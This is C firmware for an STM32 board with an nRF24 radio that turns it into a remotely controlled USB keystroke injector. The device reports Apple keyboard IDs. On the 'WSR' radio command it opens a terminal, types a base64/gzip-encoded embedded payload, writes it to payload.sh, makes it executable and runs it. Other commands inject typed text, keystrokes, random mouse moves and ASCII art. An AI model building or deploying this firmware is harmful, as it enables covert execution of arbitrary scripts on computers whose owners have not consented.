/*
 * This file is part of the libopencm3 project.
 *Пробная прога имитатор клавиатуры
*/

#include <stdlib.h>
#include <string.h>
#include <libopencm3/stm32/rcc.h>
#include <libopencm3/stm32/adc.h>
#include <libopencm3/stm32/gpio.h>
#include <libopencm3/stm32/spi.h>
#include <libopencm3/cm3/systick.h>
#include <libopencm3/usb/usbd.h>
#include <libopencm3/usb/hid.h>
#include <libopencm3/usb/cdc.h>
#include <libopencm3/cm3/nvic.h>
#include <libopencm3/stm32/exti.h>
#include "keycodes.h"
#include "hid.h"
#include "nrf24.h"
#include "ascii_art.h"
#include "ascii_art_base64.h"
#include "info_payload.h"
#include "printf.h"


uint8_t data[32]={0};
uint8_t cmd_rcv=0, mouse_move=0;

/**********************************************************************
 * Инициализация оборудования
 *********************************************************************/
void spi_nrf_init(void) {
	rcc_periph_clock_enable(NRF_RCC_SPI);
	/* Configure GPIOs:
	 *  SS=PA4,
	 *  SCK=PA5,
	 *  MISO=PA6
	 *  MOSI=PA7
	 */
	gpio_set_mode(NRF_PORT, GPIO_MODE_OUTPUT_50_MHZ,
			GPIO_CNF_OUTPUT_ALTFN_PUSHPULL, NRF_SPI_MOSI|NRF_SPI_SCK);
	//CSN and CE pin nrf24l01
	//CSN GPIO4
	//CE GPIO8
	gpio_set_mode(NRF_PORT, GPIO_MODE_OUTPUT_50_MHZ,
			GPIO_CNF_OUTPUT_PUSHPULL, NRF_CE|NRF_CSN);
	//MISO
	gpio_set_mode(NRF_PORT, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT,NRF_SPI_MISO);
	spi_reset(NRF_SPI);
	//SPI MODE1
  	spi_init_master(NRF_SPI, SPI_CR1_BAUDRATE_FPCLK_DIV_32, 
					SPI_CR1_CPOL_CLK_TO_0_WHEN_IDLE,
					SPI_CR1_CPHA_CLK_TRANSITION_1,
					SPI_CR1_DFF_8BIT, SPI_CR1_MSBFIRST);
  spi_enable_software_slave_management(NRF_SPI);
  spi_set_nss_high(NRF_SPI);//Это важно, без него не заведётся
  spi_enable(NRF_SPI);
}

void exti0_init(){//Прерывание по нисходящему фронту ноги IRQ nrf24l01
	rcc_periph_clock_enable(RCC_GPIOA);
	rcc_periph_clock_enable(RCC_AFIO);
	nvic_enable_irq(NVIC_EXTI0_IRQ);
	// Set GPIO0 (in GPIO port A) to 'input float'. 
	gpio_set_mode(GPIOA, GPIO_MODE_INPUT, GPIO_CNF_INPUT_FLOAT,	GPIO0);
	// Configure the EXTI subsystem. 
	exti_select_source(EXTI0, GPIOA);
	exti_set_trigger(EXTI0, EXTI_TRIGGER_FALLING);
	exti_enable_request(EXTI0);
	}
	
	
/***********************************************************************
 * Секция инициализации ГПСЧ
 **********************************************************************/
static uint16_t get_random(void){
	//получение случайного числа из АЦП
	//в этот раз учтём рекомендации Faberge
	uint16_t temp;
	uint8_t channel = 16;
	uint16_t adc=0;
	rcc_periph_clock_enable(RCC_GPIOA);
	/* Configure GPIOs:
	 * sensor PA1
	 */
	gpio_set_mode(GPIOA, GPIO_MODE_INPUT, GPIO_CNF_INPUT_ANALOG, GPIO4);
	rcc_periph_clock_enable(RCC_ADC1);
	rcc_set_adcpre(RCC_CFGR_ADCPRE_PCLK2_DIV2);
	/* Make sure the ADC doesn't run during config. */
	adc_power_off(ADC1);
	/* We configure everything for one single conversion. */
	adc_disable_scan_mode(ADC1);
	adc_set_single_conversion_mode(ADC1);
	adc_disable_external_trigger_regular(ADC1);
	adc_set_right_aligned(ADC1);
	/* We want to read the temperature sensor, so we have to enable it. */
	adc_enable_temperature_sensor();
	adc_set_sample_time_on_all_channels(ADC1, ADC_SMPR_SMP_28DOT5CYC);
	adc_power_on(ADC1);
	/* Wait for ADC starting up. */
	for (uint32_t i = 0; i < 800000; i++) __asm__("nop");
	//adc_reset_calibration(ADC1);
	//adc_calibrate(ADC1);
	adc_set_regular_sequence(ADC1, 1, &channel);
	for(uint8_t i=0;i<16;i++){
	temp<<=1;
	adc_start_conversion_direct(ADC1);
	/* Wait for end of conversion. */
	while (!(ADC_SR(ADC1) & ADC_SR_EOC));
	temp|=ADC_DR(ADC1)&0b1;//нас интересуют только 2 младших бита
	}
	adc_power_off(ADC1);
	rcc_periph_clock_disable(RCC_ADC1);
	return temp;
}
/**********************************************************************
 * Секция дескрипторов и функций USB
 **********************************************************************/
 
uint8_t usbd_is_connected = 1;
/* Buffer to be used for control requests. */
uint8_t usbd_control_buffer[128];
static usbd_device *usbd_dev;

const struct usb_device_descriptor dev_descr = {
	.bLength = USB_DT_DEVICE_SIZE,
	.bDescriptorType = USB_DT_DEVICE,
	.bcdUSB = 0x0200,
	.bDeviceClass = 0,
	.bDeviceSubClass = 0,
	.bDeviceProtocol = 0,
	.bMaxPacketSize0 = 64,
	.idVendor =  0x05ac,//0x05ac,
	.idProduct = 0x2228,//0x2228,
	.bcdDevice = 0x0200,
	.iManufacturer = 1,//это индексы в USB_STRINGS
	.iProduct = 2,
	.iSerialNumber = 3,
	.bNumConfigurations = 1,
};


const struct usb_interface ifaces[] = {
{
	.num_altsetting = 1,
	.altsetting = &hid_iface,
}
};

const struct usb_config_descriptor config = {
	.bLength = USB_DT_CONFIGURATION_SIZE,
	.bDescriptorType = USB_DT_CONFIGURATION,
	.wTotalLength = 0,
	.bNumInterfaces=1,
	.bConfigurationValue = 1,
	.iConfiguration = 0,
	.bmAttributes = 0xC0,
	.bMaxPower = 0x32,
	.interface = ifaces,
};

static const char *usb_strings[] = {
	"Candidum",
	"LeNiVkO",
	"001"
	};


/************************************************************************
 * Прерывания
 ***********************************************************************/

void usb_lp_can_rx0_isr(void) {
  usbd_poll(usbd_dev);
}

void exti0_isr(void){
	exti_reset_request(EXTI0);//Флаг прерывания надо сбросить вручную
	gpio_toggle(GPIOA,GPIO12);
	uint8_t status,temp,len;
	//uint8_t data[32]={0};
	status=nrf_status();
	//если прерывание вфызвано передачей
	if(status&(MAX_RT|TX_DS)){
		temp=nrf_rreg(CONFIG);
		nrf_wreg(CONFIG,temp|PRIM_RX);
		NRF_CE_HI();//включаем приём
		}	
	if(status&RX_DR){
		len=nrf_rrx_payload_width();//длинна пакета
		nrf_read(RD_RX_PLOAD,data,len);	
		//printf("DATA RECIV %d: %s\r\n",len,data);
		//run_cmd(data);
		cmd_rcv=1;//обработчик не стоит запускать в прерывании
		}
	nrf_wreg(STATUS,status);
	nrf_flushtx();
	nrf_flushrx();
}
//**********************************************************************
//Обработка принятой строки

void run_cmd(){
	
	//if(strstr(data, "WSR"))write_script_and_run_it();
	if(strstr(data, "WSR"))run_script_gzip(info_payload);
	//else if(strstr(data, "MOUSE")){if(mouse_move)mouse_move=0; else mouse_move=1;}
	else if(strstr(data, "TEST"))send_word("Hello world!\n");//need sscanf!
	else if(strstr(data, "PK2 "))pk2_decode_pres_key(data);
	else if(strstr(data, "MSHIFT"))mouse_move_rand();
	else if(strstr(data, "CATS"))send_word(cats);
	else if(strstr(data, "SEXY"))send_word(art);
	else if(strstr(data, "GIRL"))send_word(girl);
	else if(strstr(data, "BIRD"))send_word(bird);
	else if(strstr(data, "BASE641"))cat_ascii_art_gzip(girl_1_base64);
	else if(strstr(data, "BASE642"))cat_ascii_art_gzip(girl_base64);
	else send_word(data);
	//send_word("Hello world!");
	}

void pk2_decode_pres_key(char *str){
	uint8_t key=0x04;
	uint8_t mod=0;
	uint8_t *pos=strstr(str, "PK2 ")+4;//на случай если у команди префикс
	sscanf(pos, "%d %d", &key, &mod);
	send_shortkey2(key,mod);
	}
//************************************************************************

void send_word(char *wrd){
	do{
		while(9 != usbd_ep_write_packet(usbd_dev, 0x81, press_key(*wrd), 9));
		while(9 != usbd_ep_write_packet(usbd_dev, 0x81, release_key(), 9));
	}while(*(++wrd));
	}

//void send_key(char *ch){
//	while(9 != usbd_ep_write_packet(usbd_dev, 0x81, press_key(*ch), 9));
//	while(9 != usbd_ep_write_packet(usbd_dev, 0x81, release_key(), 9));
//	}

void send_shortkey(char key,uint8_t mod){
	while(9 != usbd_ep_write_packet(usbd_dev, 0x81, press_key_mod(key, mod), 9));
	while(9 != usbd_ep_write_packet(usbd_dev, 0x81, release_key(), 9));
	}
	
void send_shortkey2(uint8_t key, uint8_t mod){
	while(9 != usbd_ep_write_packet(usbd_dev, 0x81, set_key_buf(mod,key), 9));
	while(9 != usbd_ep_write_packet(usbd_dev, 0x81, release_key(), 9));
	}

void mouse_move2(int dx, int dy){
	uint8_t temp[]={2,0,0,0};
	int8_t stepx=0,stepy=0;
	//int count;
	if(dx) if(dx>0)stepx=1;else stepx=-1;
	if(dy) if(dy>0)stepy=1;else stepy=-1;
	while(dx || dy){
	if(dx){temp[2]=stepx; dx-=stepx;}else temp[2]=0;
	if(dy){temp[3]=stepy; dy-=stepy;}else temp[3]=0;
	usbd_ep_write_packet(usbd_dev, 0x81, temp, 4);
	delay_us(100);
	}
	temp[2]=0;
	temp[3]=0;
	usbd_ep_write_packet(usbd_dev, 0x81, temp, 4);
	//delay_us(1000);
	}




void mouse_move_rand(void){
	int dx,dy;
	dx=(rand()%255)-127;
	dy=(rand()%255)-127;
	mouse_move2(dx,dy);
	} 
 
void cat_ascii_art_gzip(uint8_t *ascii_art){
	send_word("echo ");
	send_word(ascii_art);
	send_word("|base64 -d|gzip -d\n");
	}
	

void run_script_gzip(uint8_t *src){
	send_shortkey('t',MOD_CTRL|MOD_ALT); //Ctrl+Alt+t - open console 
	for(uint32_t i=0;i<0x2fffff;i++)__asm__("nop");
	//cat_ascii_art_gzip(bird_base64);
	send_word("echo ");
	send_word(src);
	send_word("|base64 -d|gzip -d>payload.sh;"
			"chmod +x payload.sh;"
			"./payload.sh\n");
	for(uint32_t i=0;i<0x2fffff;i++)__asm__("nop");
	send_word("\n");
	cat_ascii_art_gzip(bird_base64);
	}

void write_script_and_run_it(){
	send_shortkey('t',MOD_CTRL|MOD_ALT); //Ctrl+Alt+t - open console 
	for(uint32_t i=0;i<0x2fffff;i++)__asm__("nop");
	send_word("echo '#!/bin/zsh' >> payload.sh\n"
				"echo Candidum is the best!>> payload.sh\n"
				"echo 'for i in {1..100}'>> payload.sh\n"
				"echo 'do echo TEST payload script $i'>> payload.sh\n"
				"echo 'done'>> payload.sh\n"
				"echo 'rm payload.sh'\n"
				"clear\n"
				"chmod +x payload.sh\n"
				"./payload.sh\n");
}


int main(void)
{
	//rcc_clock_setup_in_hse_8mhz_out_72mhz();
	rcc_clock_setup_in_hsi_out_48mhz();
	rcc_periph_clock_enable(RCC_GPIOA);
	rcc_periph_clock_enable(RCC_GPIOB);
	rcc_periph_clock_enable(RCC_AFIO);
	gpio_set_mode(GPIOB, GPIO_MODE_OUTPUT_2_MHZ,
									GPIO_CNF_OUTPUT_PUSHPULL, GPIO12);
	/*
	 * This is a somewhat common cheap hack to trigger device re-enumeration
	 * on startup.  Assuming a fixed external pullup on D+, (For USB-FS)
	 * setting the pin to output, and driving it explicitly low effectively
	 * "removes" the pullup.  The subsequent USB init will "take over" the
	 * pin, and it will appear as a proper pullup to the host.
	 * The magic delay is somewhat arbitrary, no guarantees on USBIF
	 * compliance here, but "it works" in most places.
	 */
	gpio_set_mode(GPIOA, GPIO_MODE_OUTPUT_2_MHZ,
		GPIO_CNF_OUTPUT_PUSHPULL, GPIO12);
	gpio_clear(GPIOA, GPIO12);
	gpio_clear(GPIOB,GPIO12);
	//nrf init
	spi_nrf_init();
	nrf_init();
	srand(get_random());//инициализируем ГПСЧ
	exti0_init();
	NRF_CE_HI();
	//usb driver init
	usbd_dev = usbd_init(&st_usbfs_v1_usb_driver, &dev_descr, &config, usb_strings,
		sizeof(usb_strings)/sizeof(char *),
		usbd_control_buffer, sizeof(usbd_control_buffer));
	usbd_register_set_config_callback(usbd_dev, hid_set_config);
	nvic_enable_irq(NVIC_USB_LP_CAN_RX0_IRQ); // Enable USB IRQs
	//nvic_enable_irq(NVIC_USB_WAKEUP_IRQ);
	//таймер
	for(uint32_t i=0;i<0xffffff;i++)__asm__("nop");
	while (1){
		gpio_toggle(GPIOB,GPIO12);
		if(cmd_rcv){
			run_cmd();
			for(uint8_t i=0;i<32;i++)data[i]=0;
			cmd_rcv=0;
			}
		for(uint32_t i=0;i<0xfffff;i++)__asm__("nop");
		
	}
}


